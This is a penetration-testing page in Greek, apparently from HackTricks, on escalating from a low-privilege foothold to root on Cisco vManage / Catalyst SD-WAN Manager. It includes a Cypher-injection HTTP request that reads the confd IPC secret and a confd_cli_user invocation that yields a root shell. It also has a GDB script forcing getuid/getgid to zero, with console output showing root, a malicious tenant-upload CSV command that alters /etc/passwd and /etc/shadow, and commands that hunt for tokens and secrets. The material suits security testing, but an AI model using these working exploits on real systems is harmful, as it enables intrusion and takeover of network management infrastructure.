# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Μόλις αποκτήσετε code execution στο Cisco vManage / *Catalyst SD-WAN Manager* ως `vmanage`, `netadmin` ή `vmanage-admin`, τα πιο ενδιαφέροντα local privesc surfaces είναι συνήθως το `confd` CLI stack, το helper `cmdptywrapper`, τα localhost REST APIs και οι import/upload handlers που εκτελούνται ως root.

Αν χρειάζεστε ακόμη το **initial foothold** σε έναν controller, ελέγξτε πρώτα τη dedicated control-plane σελίδα:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Γρήγορο local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αν το `/etc/confd/confd_ipc_secret` είναι readable από το foothold σας, τα Path 1 και Path 2 γίνονται αμέσως πρακτικά. Αν αποκτήσατε πρόσβαση μέσω remote info leak ή webshell, ελέγξτε επίσης αν μπορείτε ήδη να αποκτήσετε πρόσβαση σε υλικό SSH του `vmanage-admin` ή σε multitenancy upload handlers: έρευνα του 2026 έδειξε ότι και τα δύο αποτελούσαν ρεαλιστικά stepping stones.

## Path 1

(Παράδειγμα από [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Μετά από λίγη διερεύνηση σε κάποιο [documentation](http://66.218.245.39/doc/html/rn03re18.html) σχετικά με το `confd` και τα διάφορα binaries (προσβάσιμα με λογαριασμό στον ιστότοπο της Cisco), διαπιστώσαμε ότι, για την authentication του IPC socket, χρησιμοποιεί ένα secret που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Θυμάστε το instance του Neo4j; Εκτελείται με τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας έτσι να ανακτήσουμε το αρχείο χρησιμοποιώντας την προηγούμενη ευπάθεια:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Το πρόγραμμα `confd_cli` δεν υποστηρίζει ορίσματα γραμμής εντολών, αλλά καλεί το `/usr/bin/confd_cli_user` με ορίσματα. Επομένως, θα μπορούσαμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο ορισμάτων. Ωστόσο, δεν είναι αναγνώσιμο με τα τρέχοντα δικαιώματά μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας scp, να διαβάσουμε τη βοήθεια και να το χρησιμοποιήσουμε για να αποκτήσουμε το shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Διαδρομή 2

(Παράδειγμα από [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Το blog¹ της ομάδας synacktiv περιέγραψε έναν κομψό τρόπο για να αποκτήσετε ένα root shell, όμως το μειονέκτημα είναι ότι απαιτεί την απόκτηση ενός αντιγράφου του `/usr/bin/confd_cli_user`, το οποίο είναι αναγνώσιμο μόνο από τον root. Βρήκα έναν άλλο τρόπο για privilege escalation σε root χωρίς αυτή την ταλαιπωρία.

Όταν έκανα disassemble το binary `/usr/bin/confd_cli`, παρατήρησα τα εξής:

<details>
<summary>Objdump που εμφανίζει τη συλλογή UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Όταν εκτελώ «ps aux», παρατήρησα τα ακόλουθα (_σημείωση -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Υπέθεσα ότι το πρόγραμμα “confd_cli” περνά το user ID και το group ID που συλλέγει από τον συνδεδεμένο χρήστη στην εφαρμογή “cmdptywrapper”.

Η πρώτη μου προσπάθεια ήταν να εκτελέσω απευθείας το “cmdptywrapper” και να του παρέχω τα `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι κάπου στη διαδικασία δημιουργήθηκε ένα file descriptor (-i 1015), το οποίο δεν μπορώ να πλαστογραφήσω.

Όπως αναφέρεται στο blog της synacktiv (τελευταίο παράδειγμα), το πρόγραμμα `confd_cli` δεν υποστηρίζει command line argument, αλλά μπορώ να το επηρεάσω με debugger και, ευτυχώς, το GDB περιλαμβάνεται στο σύστημα.

Δημιούργησα ένα GDB script στο οποίο ανάγκασα τα API `getuid` και `getgid` να επιστρέφουν 0. Εφόσον έχω ήδη το privilege “vmanage” μέσω του deserialization RCE, έχω permission να διαβάσω απευθείας το `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Έξοδος κονσόλας</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Η Cisco τεκμηρίωσε αργότερα ένα πιο καθαρό local root path στη δική της advisory για το [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): ένας **authenticated attacker με μόνο read-only privileges** μπορούσε να στείλει ένα crafted request στο manager CLI και να μεταπηδήσει σε root λόγω ανεπαρκούς input validation.

Από offensive perspective, αυτό είναι το σημαντικό takeaway:

1. Μόλις αποκτήσεις *οποιοδήποτε* low-priv foothold στο box, πρέπει να ελέγξεις το local CLI service πριν προχωρήσεις στο πιο βαρύ workflow των Path 1 / Path 2.
2. Χρησιμοποίησε ξανά τα artifacts από το Path 2 για να εντοπίσεις το trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Αντιμετώπισε κάθε field που προωθείται στο CLI backend ως ύποπτο: UID/GID, username, terminal metadata, imported files ή οποιαδήποτε τιμή καταναλώνεται αργότερα από έναν root-owned helper.
4. Αν ένας low-priv user μπορεί να φτάσει στο local CLI socket και να επηρεάσει αυτά τα fields, το root μπορεί να απέχει μόνο ένα crafted request.

Ένα πρακτικό workflow μετά την απόκτηση πρόσβασης στη συσκευή είναι:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Αυτό μετατρέπει το bug του 2025 σε ένα καλό hunting pattern για παρόμοιες versions: αναζητήστε **local CLI shims που συλλέγουν identity στο userland και το προωθούν σε ένα πιο privileged wrapper**.

Μην συγχέετε το **CVE-2025-20122** με το μεταγενέστερο **CVE-2026-20122**: το ζήτημα του 2025 είναι ένα *local* CLI-to-root bug, ενώ το ζήτημα του 2026 είναι ένα *remote* API arbitrary file overwrite, το οποίο είναι κυρίως χρήσιμο για τη φύτευση ενός foothold και, στη συνέχεια, για την επανεξέταση των Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Η advisory της Cisco τον Φεβρουάριο του 2026 εισήγαγε επίσης μια ακόμη χρήσιμη privesc class: το [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) επέτρεπε σε έναν **authenticated, local attacker με low privileges** να αποκτήσει root, λόγω ενός ανεπαρκούς user-authentication mechanism στο REST API.

Αυτό έχει σημασία επειδή το vManage privesc δεν περιορίζεται πλέον σε abuse των `confd`/TTY. Μετά την απόκτηση ενός low-priv shell, αναζητήστε επίσης:

- endpoints API που είναι διαθέσιμα μόνο στο localhost και εμπιστεύονται υπερβολικά τον caller
- tokens, cookies ή service credentials που είναι αναγνώσιμα από τον τρέχοντα λογαριασμό
- root-only actions που εκτίθενται μέσω `dataservice`/REST handlers και μπορούν ακόμη να ενεργοποιηθούν τοπικά

Στην πράξη, μόλις αποκτήσετε shell ως `vmanage` ή ως άλλος service user, το local API abuse είναι συχνά πιο αθόρυβο και ευκολότερο να αυτοματοποιηθεί από το interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Αν το τοπικό session context επαρκεί για την πρόσβαση σε privileged REST functionality, προτιμήστε το API path: είναι ευκολότερο να γίνει replay, να γίνει script και να συνδυαστεί με κλεμμένα web sessions ή API tokens.

## Path 5 (αρχείο του 2026 που υποβλήθηκε σε επεξεργασία από το root - CVE-2026-20245)

Ένα άλλο πρόσφατο pattern είναι το [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): ένας local attacker με `netadmin` privileges μπορούσε να ανεβάσει ένα **ειδικά διαμορφωμένο αρχείο**, το οποίο στη συνέχεια διαχειριζόταν μη ασφαλώς το CLI, οδηγώντας σε command injection ως `root`.

Από την οπτική του HackTricks, η πολύτιμη τεχνική είναι ευρύτερη από το συγκεκριμένο CVE:

1. Enumerate κάθε CLI ή web workflow που αποδέχεται ένα αρχείο: imports, diagnostic bundles, templates, validators, backups, tenant data κ.λπ.
2. Trace πού καταλήγει το uploaded file και ποιο root-owned script ή binary το καταναλώνει.
3. Test αν το filename, το file content ή τα parsed metadata περνούν ποτέ σε shell commands, wrapper scripts ή helpers τύπου `system()`.
4. Αν μπορείτε ήδη να αποκτήσετε `netadmin` (με valid creds, stolen session ή auth-bypass chain), τα file-processing bugs είναι συχνά ο ταχύτερος δρόμος προς το root.

Η Google Cloud / Mandiant έδειξε αργότερα ένα πολύ συγκεκριμένο παράδειγμα αυτής της bug class, το οποίο έγινε exploited μέσω του multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Στην παρατηρηθείσα επίθεση, το specially crafted CSV κατέληξε να τροποποιεί τα `/etc/passwd` και `/etc/shadow`, ώστε να δημιουργήσει έναν προσωρινό λογαριασμό με UID 0 (`troot`). Αυτό καθιστά τους importers τύπου `tenant-upload` / `tenant-list` ιδιαίτερα ενδιαφέροντες: δεν είναι απλώς λειτουργίες data ingestion, αλλά πιθανά root-owned parser front-ends.

Ένα γρήγορο hunting pattern από το shell είναι:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Αυτή η κατηγορία bugs συνδυάζεται ιδιαίτερα καλά με remote footholds που παρέχουν `netadmin`, αλλά όχι `root`.

## Άλλα πρόσφατα vManage/Catalyst SD-WAN Manager vulns για chaining

- **Unauthenticated info leak (CVE-2026-20133)** – Ιδιαίτερα υψηλής αξίας, επειδή δημόσια έρευνα έδειξε ότι θα μπορούσε να εκθέσει το `confd_ipc_secret` ή το private key του `vmanage-admin`, μετατρέποντας ένα read bug είτε σε Path 1 είτε σε NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Διαφορετικό από το CLI bug του 2025 παραπάνω· το VulnCheck το χρησιμοποίησε για upload ενός webshell, κάτι που καθιστά άμεσα relevant τα local privesc paths αυτής της σελίδας.
- **Authenticated UI XSS (CVE-2024-20475)** – Κλέψε ένα admin session στο web UI και, στη συνέχεια, κάνε pivot σε API/CLI actions που τελικά οδηγούν σε `vshell` ή σε ένα από τα παραπάνω local privesc paths.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Πολύ ισχυρός precursor για το Path 5, επειδή το `netadmin` είναι ακριβώς το επίπεδο που απαιτείται από το crafted-file privesc του 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Παρόμοια offensive αξία με το CVE-2026-20122, αλλά μέσω ενός μεταγενέστερου web UI upload path: γράψε σε location που θα γίνει αργότερα parsed από το `root` ή από το web tier του management plane.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Οι intrusions του 2026 έδειξαν ότι οι attackers μπορούν να κάνουν rollback σε παλαιότερο vulnerable SD-WAN build, να κάνουν abuse του παλιού CLI root bug και, στη συνέχεια, να επαναφέρουν την αρχική version.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Τεκμηριώνεται καλύτερα στη dedicated SD-WAN control-plane σελίδα· μπορεί να προσθέσει ένα SSH key για το `vmanage-admin`, παρέχοντάς σου το local foothold που απαιτείται για να επιστρέψεις σε αυτήν τη σελίδα.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
